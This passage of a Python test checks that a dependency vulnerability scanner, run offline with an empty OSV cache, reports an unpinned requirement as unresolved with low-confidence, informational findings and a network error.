    proj_dir.mkdir()
    req = proj_dir / "requirements.txt"
    req.write_text("uncached-unpinned\n", encoding="utf-8")

    empty_cache_dir = tmp_path / "empty_cache"
    empty_cache_dir.mkdir()

    result = run(proj_dir, {"offline": True, "osv_cache_dir": str(empty_cache_dir)})

    # Must be marked partial with network error due to offline cache miss
    assert result.status == "partial"
    assert any(err.get("code") == "NETWORK_ERROR" for err in result.errors)

    unresolved = [f for f in result.findings if f.subject.get("name") == "uncached-unpinned" and f.category == "UNRESOLVED"]
    reasons = [e.data.get("reason") for f in unresolved for e in f.evidence]
    assert "no_exact_version" in reasons
    assert "osv_unreachable" in reasons

    # Proves the package was not silently skipped by osv_eligible filter
    unreachable_finding = next(f for f in unresolved if any(e.data.get("reason") == "osv_unreachable" for e in f.evidence))
    assert unreachable_finding.confidence == "LOW"
    assert unreachable_finding.severity == "INFO"
